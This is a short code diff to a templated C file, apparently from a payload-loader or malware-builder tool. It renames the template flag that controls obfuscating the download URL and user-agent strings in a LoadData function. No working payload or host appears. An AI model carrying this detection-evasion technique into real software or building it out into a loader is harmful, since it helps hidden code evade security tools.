@@ -5,7 +5,7 @@ BOOL LoadData(PBYTE* ppData, PDWORD pdwDataSize) {
     pfnRtlZeroMemory(url_wide, sizeof(url_wide));
     pfnRtlZeroMemory(user_agent_wide, sizeof(user_agent_wide));
 
-    {% if obfuscate_strings %}
+    {% if obfuscate_http_strings %}
         unsigned char url_bytes[] = { {{ url_obfuscated }} };
         unsigned char user_agent_bytes[] = { {{ user_agent_obfuscated }} };
         
